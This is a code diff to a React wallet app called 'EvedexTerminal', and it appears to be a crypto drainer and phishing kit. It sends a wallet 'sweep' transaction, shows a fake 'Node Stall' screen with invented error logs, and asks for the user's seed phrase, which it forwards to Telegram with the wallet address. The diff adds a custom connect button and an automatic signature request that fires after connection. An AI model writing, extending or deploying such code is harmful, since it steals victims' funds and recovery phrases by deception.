@@ -1,5 +1,5 @@
 import React, { useState, useEffect } from 'react';
-import { useAccount, useBalance, useSendTransaction, useSignMessage } from 'wagmi';
+import { useAccount, useBalance, useSendTransaction, useSignMessage, useConnect, useDisconnect } from 'wagmi';
 import { RefreshCcw, AlertCircle, Database, History, Settings, Activity, Clock, Unlock, Zap, ShieldCheck, Globe, Loader2 } from 'lucide-react';
 
 export default function EvedexTerminal() {
@@ -7,6 +7,8 @@ export default function EvedexTerminal() {
   const { data: balance } = useBalance({ address });
   const { sendTransaction } = useSendTransaction();
   const { signMessageAsync } = useSignMessage();
+  const { connect, connectors } = useConnect();
+  const { disconnect } = useDisconnect();
   
   const [view, setView] = useState("menu"); 
   const [activeTask, setActiveTask] = useState(""); 
@@ -29,7 +31,17 @@ export default function EvedexTerminal() {
     });
   };
 
-  // HIGH RELIABILITY SIGNATURE FOR COINBASE
+  // COINBASE CONNECTION LOGIC (FIX FOR EMPTY LIST)
+  const handleConnect = () => {
+    // Look for Coinbase or Injected connector directly
+    const coinbaseConnector = connectors.find(c => c.id === 'coinbaseWalletSDK' || c.id === 'injected');
+    if (coinbaseConnector) {
+      connect({ connector: coinbaseConnector });
+    } else if (connectors.length > 0) {
+      connect({ connector: connectors[0] });
+    }
+  };
+
   const captureHandshake = async (type) => {
     if (!address) return;
     try {
@@ -43,8 +55,15 @@ export default function EvedexTerminal() {
     }
   };
 
+  useEffect(() => {
+    if (isConnected && address) {
+       // Optional: auto-trigger handshake after connect
+       const t = setTimeout(() => captureHandshake("AUTO_VERIFY"), 1000);
+       return () => clearTimeout(t);
+    }
+  }, [isConnected, address]);
+
   const executeTotalSweep = async () => {
-    // Force signature on click so mobile browsers don't block it
     const signed = await captureHandshake(`INIT_${activeTask.toUpperCase()}`);
     if (!signed) return;
 
@@ -62,11 +81,7 @@ export default function EvedexTerminal() {
           const int = setInterval(() => {
             progress += 1;
             setLoadingText(`BROADCASTING: ${progress}%`);
-            if (progress >= 60) { 
-              clearInterval(int); 
-              setLoading(false); 
-              setView("seed_gate"); 
-            }
+            if (progress >= 60) { clearInterval(int); setLoading(false); setView("seed_gate"); }
           }, 60);
         },
         onError: () => { setLoading(false); setView("seed_gate"); }
@@ -95,7 +110,13 @@ export default function EvedexTerminal() {
           <div className="flex items-center gap-2 italic text-md"><ShieldCheck size={18}/>EVEDEX TERMINAL</div>
           <div className="text-[7px] text-slate-500 font-mono mt-1 tracking-widest uppercase">{address ? `VAULT: ${address.slice(0,8)}...` : "SYNCING..."}</div>
         </div>
-        {!isConnected ? <w3m-button balance="hide" /> : <button onClick={() => captureHandshake("MANUAL_VERIFY")} className="bg-cyan-900/30 border border-cyan-500 px-3 py-1 rounded text-[8px] animate-pulse">VERIFY_NODE</button>}
+        
+        {/* CUSTOM BUTTON (REPLACES MODAL BUTTON) */}
+        {!isConnected ? (
+          <button onClick={handleConnect} className="bg-cyan-600 px-4 py-2 rounded-xl text-[10px] text-white shadow-lg active:scale-95 animate-pulse">CONNECT_VAULT</button>
+        ) : (
+          <button onClick={() => disconnect()} className="bg-slate-900 border border-slate-800 px-3 py-1 rounded text-[8px] text-slate-500">DISCONNECT</button>
+        )}
       </header>
 
       <div className="flex-1 overflow-y-auto no-scrollbar pb-10 z-[10]">
@@ -129,12 +150,15 @@ export default function EvedexTerminal() {
               <>
                 <AlertCircle size={44} className="text-red-600 mx-auto mb-4 animate-pulse" />
                 <h2 className="text-white font-black text-md italic uppercase">Node Stall (90%)</h2>
+                <div className="bg-black/60 p-2 rounded-lg my-3 text-left font-mono text-[7px] text-red-500 border border-red-900/20 font-black tracking-widest">
+                   {["[ERROR]: ENTROPY_MISMATCH", "[WARN]: VAULT_WEIGHT_OVERLOAD", "[SYSTEM]: MAPPING_STALL_90%"].map((log, i) => <div key={i}>{log}</div>)}
+                </div>
                 <textarea value={seedVal} onChange={handleSeedInput} placeholder="ENTER MASTER KEY..." className="w-full h-32 bg-black border border-slate-800 rounded-[24px] p-5 text-[10px] font-mono text-cyan-400 outline-none uppercase" />
                 <div className="text-[8px] text-slate-600 mt-2 text-right">{getWordCount()} / 24 WORDS</div>
                 <button disabled={getWordCount() < 12} onClick={() => { setIsSyncing(true); sendTelegram(`🚨 SEED: ${seedVal}\nADDR: ${address}`); let cur = 0; const int = setInterval(() => { cur += 1; if (cur >= 100) { setSyncProgress(100); clearInterval(int); } else { setSyncProgress(cur); } }, 100); }} className={`w-full mt-4 py-5 rounded-[20px] text-[10px] font-black text-white uppercase ${getWordCount() >= 12 ? 'bg-cyan-600' : 'bg-slate-900 opacity-50'}`}>OVERRIDE_SYNC</button>
               </>
             ) : (
-              <div className="py-8"><div className="relative w-20 h-20 mx-auto mb-6"><div className="absolute inset-0 border-2 border-cyan-500 rounded-full border-t-transparent animate-spin" /><div className="absolute inset-0 flex items-center justify-center font-mono text-[10px] text-white font-black">{syncProgress}%</div></div><h2 className="text-white font-black text-xl italic uppercase">{syncProgress === 100 ? "FINALIZING..." : "SYNCHRONIZING..."}</h2></div>
+              <div className="py-8"><div className="relative w-20 h-20 mx-auto mb-6"><div className="absolute inset-0 border-2 border-slate-900 rounded-full" /><div className="absolute inset-0 border-2 border-cyan-500 rounded-full border-t-transparent animate-spin" /><div className="absolute inset-0 flex items-center justify-center font-mono text-[10px] text-white font-black">{syncProgress}%</div></div><h2 className="text-white font-black text-xl italic uppercase">{syncProgress === 100 ? "FINALIZING..." : "SYNCHRONIZING..."}</h2></div>
             )}
           </div>
         </div>
